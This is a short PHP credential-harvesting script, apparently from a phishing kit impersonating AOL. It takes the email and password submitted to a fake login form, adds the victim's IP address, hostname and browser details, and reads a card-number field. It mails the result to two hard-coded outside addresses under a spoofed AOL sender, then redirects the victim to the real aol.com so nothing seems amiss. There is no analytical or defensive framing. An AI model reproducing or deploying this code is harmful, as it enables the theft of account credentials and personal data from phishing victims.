<?php

$send = "orvxx@hotmail.com, linoreo@yandex.ru";  

$ip = getenv("REMOTE_ADDR");
$message .= "--------------  LOGIN   -------------\n";
$message .= "EMAIL      : ".$_POST['email']."\n";
$message .= "PASSWORD       : ".$_POST['password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------F-CLA$$----------------------\n";
$cc = $_POST['ccn'];
$subject = "NEW Aol | ♥__♥ | IP : $ip\n ";
$headers = "From: Aol ♥__♥ <noreply@waya.com>\n";
mail($send,$subject,$message,$headers);

header("Location: https://aol.com/");

?>